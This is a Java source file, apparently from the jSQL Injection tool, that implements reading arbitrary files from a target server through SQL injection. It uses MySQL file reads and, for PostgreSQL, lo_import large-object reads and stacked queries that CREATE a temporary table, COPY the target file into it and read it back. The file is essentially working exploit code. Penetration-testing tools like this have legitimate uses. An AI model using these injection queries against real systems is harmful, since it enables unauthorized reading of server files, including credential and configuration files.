package com.jsql.model.accessible;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.database.MockElement;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.concurrent.Callable;

/**
 * Thread unit to read source of a file by SQL injection.
 * User can interrupt the process and get a partial result of the file content.
 */
public class CallableFile implements Callable<CallableFile> {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();
    
    /**
     * Path to the file to read.
     */
    private final String pathFile;

    /**
     * Source of file.
     */
    private String sourceFile = StringUtils.EMPTY;
    
    /**
     * Suspendable task that reads lines of the file by injection.
     */
    private final SuspendableGetRows suspendableReadFile;

    private final InjectionModel injectionModel;
    
    /**
     * Create Callable to read a file.
     */
    public CallableFile(String pathFile, InjectionModel injectionModel) {
        this.pathFile = pathFile;
        this.injectionModel= injectionModel;
        this.suspendableReadFile = new SuspendableGetRows(injectionModel);
    }
    
    /**
     * Read a file on the server using SQL injection.
     * Get partial result if user interrupts the process.
     */
    @Override
    public CallableFile call() throws Exception {
        var sourcePage = new String[]{ StringUtils.EMPTY };

        String resultToParse = StringUtils.EMPTY;
        try {
            if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()) {
                resultToParse = this.suspendableReadFile.run(
                    this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
                    sourcePage,
                    false,
                    1,
                    MockElement.MOCK,
                    "mysql#file"
                );
            } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getPostgres()) {
                try {
                    resultToParse = this.suspendableReadFile.run(
                        this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
                        sourcePage,
                        false,
                        1,
                        MockElement.MOCK,
                        "pg#file"
                    );
                } catch (InjectionFailureException e) {
                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read data folder failure, trying with large object");
                    var loid = this.getResult("SELECT lo_import('"+ this.pathFile +"')::text", "pg#add-loid");
                    if (StringUtils.isNotEmpty(loid)) {
                        resultToParse = this.getResult("SELECT convert_from(lo_get("+ loid +"),'utf8')::text", "pg#read-lo");
                    }
                    if (StringUtils.isEmpty(resultToParse)) {
                        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read large object failure, trying with stack read");
                        var nameLibraryRandom = "tmp_" + RandomStringUtils.secure().nextAlphabetic(8);  // no dash in table name
                        this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
                        this.injectionModel.injectWithoutIndex(";create table " + nameLibraryRandom + "(data text);", "pg#add-tbl");
                        this.injectionModel.injectWithoutIndex(";copy " + nameLibraryRandom + "(data) from '" + this.pathFile + "' delimiter E'\\x01';", "pg#copy");
                        resultToParse = this.suspendableReadFile.run(
                            "array_to_string(array(select * from " + nameLibraryRandom + "),'\\n')",
                            sourcePage,
                            false,
                            1,
                            MockElement.MOCK,
                            "pg#get-tbl"
                        );
                        this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
                    }
                }
            }
        } catch (InjectionFailureException e) {
            // Usually thrown if File does not exist
            LOGGER.log(LogLevelUtil.IGNORE, e);
        } catch (StoppedByUserSlidingException e) {
            // Get partial source
            if (StringUtils.isNotEmpty(e.getSlidingWindowAllRows())) {
                resultToParse = e.getSlidingWindowAllRows();
            } else if (StringUtils.isNotEmpty(e.getSlidingWindowCurrentRows())) {
                resultToParse = e.getSlidingWindowCurrentRows();
            }
            LOGGER.log(LogLevelUtil.IGNORE, e);
        }
        
        this.sourceFile = resultToParse;
        return this;
    }

    public String getResult(String query, String metadata) {
        var sourcePage = new String[]{ StringUtils.EMPTY };
        try {
            return new SuspendableGetRows(this.injectionModel).run(
                query,
                sourcePage,
                false,
                0,
                MockElement.MOCK,
                metadata
            );
        } catch (JSqlException ignored) {
            return StringUtils.EMPTY;
        }
    }

    // Getters
    
    public String getPathFile() {
        return this.pathFile;
    }

    public String getSourceFile() {
        return this.sourceFile;
    }

    public SuspendableGetRows getSuspendableReadFile() {
        return this.suspendableReadFile;
    }
}